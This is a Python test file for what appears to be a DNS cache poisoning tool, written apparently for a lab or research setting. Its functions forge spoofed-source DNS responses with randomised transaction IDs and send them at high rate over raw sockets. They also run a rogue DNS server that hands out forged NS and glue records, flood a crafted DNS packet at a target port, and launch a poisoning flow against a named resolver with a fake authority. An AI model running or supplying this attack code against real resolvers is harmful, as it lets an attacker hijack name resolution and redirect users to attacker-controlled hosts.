#!/usr/bin/python3
# # Imports
import json
import socket
import argparse
from scapy.layers.inet import IP, UDP, Ether
from scapy.layers.dns import DNS
from src.dns_message.dns_message import DNSMessage
from src.dns_cache_poison.dns_cache_poison import MainPoisonFlow
from scapy.sendrecv import send, sniff
from scapy.packet import ls, NoPayload


def test_1():
    """
        使用scapy生成包, 使用原始套接字发包 10000包只需0.05s 发包率为 10 ^ 5 pps
        由于没有在发包过程中自动调整策略的模块, 因此可以先生成所有的包保存在内存中, 然后逐一发送, 时间复杂度为常数(迭代)
    """
    pkt = Ether() / IP(dst="10.241.132.153", src="123.151.137.18") / UDP(dport=53, sport=53) / DNS()
    print(pkt.build())
    ls(pkt)
    # print(ls(pkt))
    # send(pkt) # # 使用scapy函数 send
    _b = pkt.build()
    raw_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
    raw_socket.bind(("ens160", 0))
    import time
    import random 
    t1 = time.time()
    for _ in range(65536):
        _b = _b[:42] + random.randint(0, 65535).to_bytes(2, "big") + _b[44:]
        raw_socket.send(_b)
    print(time.time() - t1)


def test_2():
    """
        测量DNS之前的协议的头部长度 42bit 14bit(Ether) + 20 bit(IP) + 8bit(UDP)
    """
    pkt = Ether() / IP(dst="10.241.132.153", src="28.38.48.58") / UDP(dport=53, sport=53)
    # pkt = IP(dst="10.241.132.153", src="28.38.48.58")
    pkt = UDP(dport=53, sport=53)
    print(len(pkt.build()))


def test_3():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('10.245.146.73', 53))
    while True:
        _recv, _addr = sock.recvfrom(4096)
        ls(DNS(_recv))
        _dns_response_message = DNSMessage()
        _dns_response_message.parse(_recv)
        _name = '.'.join(_dns_response_message.queries[0]['labels'])
        _domain = 'hanbingtest.com'
        if "ns" in _name:
            _dns_response_message.set_numbers(0x8400, 1, 1, 0, 0, )
            _dns_response_message.additional_records = []
            _dns_response_message.authoritative_nameservers = []
            _dns_response_message.answers = []
            _dns_response_message.answers.append({
                'name': "ns100." + _domain,
                "type": 1,
                "class": 1,
                "ttl": 24 * 60 * 60 * 2,
                "data_length": 4,
                "address": "2.2.2.2"
            })
            _dns_response_message.answers.append({
                'name': "ns100." + _domain,
                "type": 28,
                "class": 1,
                "ttl": 24 * 60 * 60 * 2,
                "data_length": 16,
                "address": "2001:da8:7019:236:31e4:a13f:67:226e"
            })
        else:
            _dns_response_message.set_numbers(0x8400, 1, 1, 1, 1, )
            _dns_response_message.additional_records = []
            _dns_response_message.authoritative_nameservers = []
            _dns_response_message.answers = []
            _dns_response_message.answers.append({
                'name': _name,
                'type': 1,
                'class': 1,
                "ttl": 24 * 60 * 60 * 2,
                "data_length": 4,
                "address": "8.8.8.8"
            })
            _dns_response_message.authoritative_nameservers.append({
                'name': _domain,
                "type": 2,
                "class": 1,
                "ttl": 24 * 60 * 60 * 2,
                "data_length": 4,
                "address": "ns100." + _domain
            })
            _dns_response_message.additional_records.append({
                'name': "ns100." + _domain,
                "type": 1,
                "class": 1,
                "ttl": 24 * 60 * 60 * 2,
                "data_length": 4,
                "address": "2.2.2.2"
            })
            _dns_response_message.additional_records.append({
                'name': "ns100." + _domain,
                "type": 28,
                "class": 1,
                "ttl": 24 * 60 * 60 * 2,
                "data_length": 16,
                "address": "2001:da8:7019:236:31e4:a13f:67:226e"
            })
        # # 发送包
        sock.sendto(_dns_response_message.to_bytes(), _addr)
        

class Sniff:
    def __init__(self, _dns_server):
        self.max_count = 1000
        self.count = 0
        self.dns_server = _dns_server
        self.port_record = []

    def my_summary(self, _pkt: Ether):
        _ret = {}
        is_dns_flag = False
        while True:
            if isinstance(_pkt, NoPayload):
                self.count += 1
                break
            else:
                if _pkt.name == "Ethernet":
                    _ret[_pkt.name] = {'src': _pkt.fields['src'], 'dst': _pkt.fields['dst']}
                elif _pkt.name == "IP":
                    _ret[_pkt.name] = {'src': _pkt.fields['src'], 'dst': _pkt.fields['dst']}
                elif _pkt.name == "UDP":
                    _ret[_pkt.name] = {'src': _pkt.fields['sport'], 'dst': _pkt.fields['dport']}
                elif _pkt.name == "DNS":
                    is_dns_flag = True
                    self.port_record.append(_ret['UDP']['src'])
                    _ret[_pkt.name] = _pkt.fields, _pkt
                    ls(_pkt)
                _pkt = _pkt.payload
        if is_dns_flag:
            return "%d %s:%s(%s) => %s:%s(%s)" % (
                self.count, _ret['IP']['src'], _ret['UDP']['src'], _ret['Ethernet']['src'], _ret['IP']['dst'],
                _ret['UDP']['dst'], _ret['Ethernet']['dst'])
        else:
            return None

    def sniff(self):
        self.last_sniff_res = sniff(filter="ip src %s and udp" % self.dns_server, prn=lambda x: self.my_summary(x),
                                    count=self.max_count)
    

def test_4():
    s = Sniff("10.245.146.73")
    s.sniff()


def test_5():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(("10.245.146.73", 32796))
        _base_response = b"\x02\xc3\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x0c\x73\x65\x74" + \
    b"\x74\x69\x6e\x67\x73\x2d\x77\x69\x6e\x04\x64\x61\x74\x61\x09\x6d" + \
    b"\x69\x63\x72\x6f\x73\x6f\x66\x74\x03\x63\x6f\x6d\x00\x00\x1c\x00\x01"
        while True:
            sock.sendto(_base_response, ("10.236.91.193", 23434))
    except KeyboardInterrupt as e:
        print("Aborted!", e)
    finally:
        sock.close()


def test_6():
    _pkt = Ether() / IP(dst="10.236.91.193", src="10.245.146.73") / UDP(dport=33333, sport=53)
    _b = _pkt.build()
    print(_b)

def test_7():
    from src.detect.detect import dns_server_random_client
    dns_server_random_client(_dns_server="10.245.146.74")

def test_8():
    mpf = MainPoisonFlow(_target="10.245.146.74", _domain="example.com", 
                        _is_random=False, _port_scale=list(range(33333, 33334)), 
                        _authority_ip='199.43.135.53',
                        # _authority_name="ns.dnslabattacker.net",
                        _authority_name="makechinagreatagain.top",
                        # _authority_name="ns1.example.com",
                        _fake_authority_ip="152.136.138.123",
                        _count=-1)
    mpf.flow()

def test_9():
    _parser = argparse.ArgumentParser()
    _args = _parser.parse_args()
    _config_file = "config.json"
    with open(_config_file, "r", encoding="utf-8") as f:
        _args.__dict__ = json.load(f)
    print(_args)

def test_10():
    from src.basic import IpCalc, IP_STR, IP_DECIMAL

    ipc = IpCalc()
    print(ipc.func_map[IP_STR - IP_DECIMAL]('39.156.66.14'))

if __name__ == "__main__":
    # test_6()
    # test_8()
    # test_9()
    test_10()